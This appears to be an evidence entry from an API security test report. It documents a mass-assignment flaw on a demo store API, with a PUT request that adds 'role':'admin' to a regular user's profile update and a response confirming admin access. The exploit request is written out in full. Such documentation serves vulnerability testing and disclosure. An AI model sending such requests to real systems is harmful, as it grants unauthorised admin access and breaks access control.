## Evidence: mass-assign-role — Mass Assignment on User Role

### Request
PUT /api/v1/users/me/profile HTTP/1.1
Host: duck-store.escape.tech
Content-Type: application/json
Authorization: Bearer eyJ...regular-user-token

{"display_name":"hacker","role":"admin","UserUpdate":true}

### Response
HTTP/1.1 200 OK
Content-Type: application/json

{"username":"attacker","role":"admin","display_name":"hacker"}

### Analysis
The UserUpdate endpoint at /api/v1/users/me/profile accepts the role field via mass assignment, escalating from regular user to admin.
